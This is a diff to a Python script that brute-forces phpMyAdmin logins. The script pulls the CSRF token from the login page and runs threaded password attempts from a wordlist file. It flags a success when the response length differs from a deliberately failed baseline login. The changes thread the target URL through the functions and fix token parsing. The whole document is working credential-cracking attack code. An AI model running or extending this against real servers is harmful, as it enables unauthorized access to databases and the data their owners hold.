@@ -8,12 +8,13 @@ import re
 import time
 import requests
 
-from thread import WorkManager
+from threads import WorkManager
 
 
-def pma_login(uname, pwd, token):
+def pma_login(url, uname, pwd, token):
     """
     登录 phpmyadmin 的过程
+    :param url: pma 地址
     :param uname: 用户名
     :param pwd: 密码
     :param token: 登录token
@@ -54,11 +55,10 @@ def init(url, uname):
     except AssertionError:
         exit(res.text)
 
-    token = re.findall("name=\"token\" value=\"(.*?)\" /><fieldset>", res.text)
-    token = str(token).replace("[u\'", "").replace("\']", "")
+    token = re.findall("name=\"token\" value=\"(.*?)\" /><fieldset>", res.text)[0]
     print("[!]Token:" + token)
 
-    r = pma_login(uname, 'error_password_t3ri', token)
+    r = pma_login(url, uname, 'error_password_t3ri', token)
 
     contentLengthRaw = len(r.text)
 
@@ -67,7 +67,7 @@ def init(url, uname):
     return token, contentLengthRaw
 
 
-def crack_pma(uname, pwd, token, contentLengthRaw, timeDelay):
+def crack_pma(url, uname, pwd, token, contentLengthRaw, timeDelay):
     """
 
     :param uname: 用户名
@@ -77,7 +77,7 @@ def crack_pma(uname, pwd, token, contentLengthRaw, timeDelay):
     :param timeDelay: 爆破延时时间
     :return:
     """
-    r = pma_login(uname, pwd, token)
+    r = pma_login(url, uname, pwd, token)
     try:
         contentLength = len(r.text)
     except AttributeError as e:
@@ -116,7 +116,7 @@ if __name__ == '__main__':
         for pwd in open("password.txt"):
             pwd = pwd.replace("\r", "").replace("\n", "")
 
-            wm.add_job(crack_pma, uname, pwd, token, contentLengthRaw, timeDelay)
+            wm.add_job(crack_pma, url, uname, pwd, token, contentLengthRaw, timeDelay)
 
     wm.start()
     wm.wait_for_complete()
